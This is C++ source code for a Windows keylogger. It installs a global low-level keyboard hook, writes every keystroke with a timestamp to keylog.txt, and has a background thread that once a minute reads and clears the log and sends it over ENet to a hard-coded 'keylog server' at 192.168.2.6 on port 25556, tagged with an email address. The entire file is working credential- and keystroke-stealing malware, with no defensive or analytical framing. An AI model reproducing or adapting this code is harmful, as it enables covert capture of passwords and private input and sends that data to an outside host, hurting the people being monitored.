#include <fstream>
#include <string>
#include <ctime>
#include <mutex>
#include <atomic>
#include <chrono>
#include <thread>
#include <enet/enet.h>


// Mutex for synchronized file access
std::mutex logMutex;

// Flag to control keylogger thread
std::atomic<bool> isKeyloggerRunning(true);

// Define an email variable to be used for sending logs
std::string userEmail = "";

// Keylogger functionality with upper/lowercase detection
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD keyCode = kbStruct->vkCode;
        
        // Open file for appending with mutex lock
        std::lock_guard<std::mutex> guard(logMutex);
        std::ofstream logFile("keylog.txt", std::ios::app);
        
        if (logFile.is_open()) {
            // Get current time
            time_t now = time(0);
            char buffer[80];
            struct tm timeInfo;
            localtime_s(&timeInfo, &now);
            strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &timeInfo);
            
            // Log the key with timestamp
            logFile << buffer << " - Key pressed: ";
            
            // Handle special keys and printable characters
            switch (keyCode) {
                case VK_RETURN:
                    logFile << "[ENTER]";
                    break;
                case VK_SPACE:
                    logFile << "[SPACE]";
                    break;
                case VK_BACK:
                    logFile << "[BACKSPACE]";
                    break;
                case VK_TAB:
                    logFile << "[TAB]";
                    break;
                case VK_SHIFT:
                    logFile << "[SHIFT]";
                    break;
                case VK_CONTROL:
                    logFile << "[CTRL]";
                    break;
                case VK_MENU:
                    logFile << "[ALT]";
                    break;
                case VK_CAPITAL:
                    logFile << "[CAPS LOCK]";
                    break;
                case VK_ESCAPE:
                    logFile << "[ESC]";
                    break;
                default:
                    // Check for letter keys and handle case sensitivity
                    if (keyCode >= 'A' && keyCode <= 'Z') {
                        // Get the state of the keyboard for handling uppercase/lowercase
                        bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                        bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                        
                        // Determine if the character should be uppercase or lowercase
                        bool makeUppercase = (shiftPressed && !capsLockOn) || (!shiftPressed && capsLockOn);
                        
                        if (makeUppercase) {
                            logFile << static_cast<char>(keyCode); // Uppercase
                        } else {
                            logFile << static_cast<char>(keyCode + 32); // Lowercase (ASCII difference)
                        }
                    } 
                    // Handle numeric and symbol keys
                    else {
                        // Convert virtual key code to character
                        BYTE keyboardState[256] = {0};
                        
                        // Update the keyboard state
                        if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                            keyboardState[VK_SHIFT] = 0x80;
                        }
                        
                        char result[4] = {0};
                        WORD character = 0;
                        int conversionResult = ToAscii(keyCode, kbStruct->scanCode, keyboardState, &character, 0);
                        
                        if (conversionResult == 1) {
                            result[0] = (char)character;
                            logFile << result[0];
                        } else {
                            logFile << "[" << keyCode << "]";
                        }
                    }
                    break;
            }
            
            logFile << std::endl;
            logFile.close();
        }
    }
    
    // Call the next hook in the chain
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Function to send keylog data to server
// Function to send keylog data to server
void sendKeylogData() {
    // Initialize ENet
    if (enet_initialize() != 0) {
        return;
    }
    
    // Create client network interface
    ENetHost* client = enet_host_create(
        nullptr,  // No specific bind address
        1,        // Only one outgoing connection
        2,        // Two channels
        0, 0      // No bandwidth limits
    );
    
    if (!client) {
        enet_deinitialize();
        return;
    }
    
    // Set server address - using the dedicated keylog server
    ENetAddress address;
    enet_address_set_host(&address, "192.168.2.6");  // Keylog server IP address
    address.port = 25556;                          // Keylog server port (different from main server)
    
    // Attempt connection
    ENetPeer* peer = enet_host_connect(client, &address, 2, 0);
    if (!peer) {
        enet_host_destroy(client);
        enet_deinitialize();
        return;
    }
    
    // Wait for connection
    ENetEvent event;
    if (enet_host_service(client, &event, 5000) <= 0 || event.type != ENET_EVENT_TYPE_CONNECT) {
        enet_peer_reset(peer);
        enet_host_destroy(client);
        enet_deinitialize();
        return;
    }
    
    // Read the keylog file with mutex lock
    std::string logData;
    {
        std::lock_guard<std::mutex> guard(logMutex);
        std::ifstream logFile("keylog.txt");
        if (logFile.is_open()) {
            std::stringstream buffer;
            buffer << logFile.rdbuf();
            logData = buffer.str();
            logFile.close();
            
            // Clear the file after reading
            std::ofstream clearFile("keylog.txt", std::ios::trunc);
            clearFile.close();
        }
    }
    
    // Format the message: Email:example@gmail.com|KeylogData: data
    std::string message;
    if (!userEmail.empty() && !logData.empty()) {
        message = "KEYLOG:Email:" + userEmail + "|KeylogData: " + logData;
        
        // Create and send the packet
        ENetPacket* packet = enet_packet_create(
            message.c_str(),
            message.size() + 1,
            ENET_PACKET_FLAG_RELIABLE
        );
        enet_peer_send(peer, 0, packet);
        enet_host_flush(client);
        
        // Wait for confirmation (up to 3 seconds)
        bool received = false;
        while (enet_host_service(client, &event, 3000) > 0) {
            if (event.type == ENET_EVENT_TYPE_RECEIVE) {
                // Received confirmation
                received = true;
                enet_packet_destroy(event.packet);
                break;
            }
        }
    }
    
    // Cleanup
    enet_peer_disconnect(peer, 0);
    
    // Wait for disconnect acknowledgment
    while (enet_host_service(client, &event, 3000) > 0) {
        if (event.type == ENET_EVENT_TYPE_RECEIVE) {
            enet_packet_destroy(event.packet);
        } 
        else if (event.type == ENET_EVENT_TYPE_DISCONNECT) {
            break;
        }
    }
    
    enet_host_destroy(client);
    enet_deinitialize();
}

// Periodic sender thread function
void senderThread() {
    while (isKeyloggerRunning) {
        // Sleep for one minute
        std::this_thread::sleep_for(std::chrono::minutes(1));
        
        // Send data to server
        sendKeylogData();
    }
}

// Keylogger thread function
void keyloggerThread() {
    // Clear or create the log file with mutex lock
    {
        std::lock_guard<std::mutex> guard(logMutex);
        std::ofstream logFile("keylog.txt");
        logFile << "Keylogger started at " << time(nullptr) << std::endl;
        logFile.close();
    }
    
    // Set up the keyboard hook
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
    
    if (keyboardHook == NULL) {
        std::cerr << "Failed to install hook!" << std::endl;
        return;
    }
    
    // Message loop to keep the program running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Unhook and cleanup
    UnhookWindowsHookEx(keyboardHook);
}

// Function to set user email
void setUserEmail(const std::string& email) {
    userEmail = email;
}